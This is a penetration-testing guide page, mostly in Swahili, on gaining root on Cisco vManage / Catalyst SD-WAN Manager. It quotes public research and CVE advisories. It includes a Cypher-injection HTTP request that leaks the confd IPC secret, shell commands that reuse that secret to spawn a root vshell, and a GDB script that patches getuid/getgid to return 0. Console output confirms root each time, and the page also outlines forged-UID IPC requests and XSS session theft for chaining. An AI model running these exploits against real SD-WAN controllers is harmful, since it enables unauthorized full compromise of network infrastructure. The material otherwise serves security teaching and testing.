# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

## Path 1

(Mfano kutoka kwa [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Baada ya kuchimba kidogo kupitia baadhi ya [documentation](http://66.218.245.39/doc/html/rn03re18.html) zinazohusiana na `confd` na binaries tofauti (zinazopatikana kwa akaunti kwenye tovuti ya Cisco), tuligundua kwamba ili kuthibitisha soketi ya IPC, inatumia siri iliyoko katika `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Kumbuka instance yetu ya Neo4j? Inafanya kazi chini ya ruhusa za mtumiaji `vmanage`, hivyo kutuwezesha kupata faili kwa kutumia udhaifu uliotangulia:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Programu ya `confd_cli` haiungi mkono vigezo vya command line lakini inaita `/usr/bin/confd_cli_user` na vigezo. Kwa hivyo, tunaweza kuita moja kwa moja `/usr/bin/confd_cli_user` na seti yetu ya vigezo. Hata hivyo, haiwezi kusomwa kwa vibali vyetu vya sasa, hivyo tunapaswa kuipata kutoka rootfs na kuikopisha kwa kutumia scp, kusoma help, na kuitumia kupata shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Njia 2

(Mfano kutoka kwa [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Blogu¹ ya timu ya synacktiv ilieleza njia nzuri ya kupata root shell, lakini shida ni kwamba inahitaji kupata nakala ya `/usr/bin/confd_cli_user` ambayo inasomwa tu na root. Nilipata njia nyingine ya kupanda hadhi hadi root bila taabu hiyo.

Nilipopasua binary ya `/usr/bin/confd_cli`, niliona yafuatayo:

<details>
<summary>Objdump showing UID/GID collection</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Nilipokimbiza “ps aux”, niliona yafuatayo (_note -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Nilihukumu kwamba programu "confd_cli" inapitisha user ID na group ID ilizokusanya kutoka kwa mtumiaji aliyeingia kwa programu "cmdptywrapper".

Jaribio langu la kwanza lilikuwa kuendesha "cmdptywrapper" moja kwa moja na kumpa `-g 0 -u 0`, lakini lilikosea. Inaonekana file descriptor (-i 1015) iliumbwa mahali fulani njiani na siwezi kuiga.

Kama ilivyoelezwa kwenye blogi ya synacktiv (mfano wa mwisho), programu `confd_cli` haisaidii command line arguments, lakini ninaweza kuibadilisha kwa debugger na kwa bahati GDB imejumuishwa kwenye mfumo.

Nilitengeneza script ya GDB ambapo nililazimisha API `getuid` na `getgid` zirudishe 0. Kwa kuwa tayari nina ruhusa ya "vmanage" kupitia deserialization RCE, nina idhini ya kusoma `/etc/confd/confd_ipc_secret` moja kwa moja.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Matokeo ya konsoli:

<details>
<summary>Matokeo ya konsoli</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Njia 3 (hitilafu ya uthibitishaji wa pembejeo ya CLI ya 2025)

Cisco renamed vManage to *Catalyst SD-WAN Manager*, lakini CLI ya chini bado inaendesha kwenye sanduku lile lile. Ufafanuzi wa 2025 (CVE-2025-20122) unaelezea ukosefu wa uthibitishaji wa pembejeo kwenye CLI unaoruhusu **mtumiaji yeyote wa ndani aliyethibitishwa** kupata root kwa kutuma ombi lililotengenezwa kwa huduma ya manager CLI. Unganisha kificho chochote cha upatikanaji wa kibali cha chini (mfano, Neo4j deserialization kutoka Path1, au shell ya mtumiaji wa cron/backup) na hitilafu hii ili kuruka kuwa root bila kunakili `confd_cli_user` au kuambatanisha GDB:

1. Tumia shell yako ya kibali cha chini kutafuta endpoint ya CLI IPC (kawaida listener ya `cmdptywrapper` inayoonekana kwenye port 4565 katika Path2).
2. Tengeneza ombi la CLI linaloforge sehemu za UID/GID kuwa 0. mdudu wa uthibitishaji unashindwa kutekeleza UID ya mwito asilia, hivyo wrapper inaanzisha PTY yenye msaada wa root.
3. Pipe mfululizo wowote wa maagizo (`vshell; id`) kupitia ombi lililotengenezwa kupata shell ya root.

> The exploit surface is local-only; remote code execution is still required to land the initial shell, but once inside the box exploitation is a single IPC message rather than a debugger-based UID patch.

## Other recent vManage/Catalyst SD-WAN Manager vulns to chain

* **Authenticated UI XSS (CVE-2024-20475)** – Inject JavaScript in specific interface fields; stealing an admin session gives you a browser-driven path to `vshell` → local shell → Path3 for root.

## References

- [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-priviesc-WCk7bmmt.html)
- [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-xss-zQ4KPvYd.html)

{{#include ../../banners/hacktricks-training.md}}
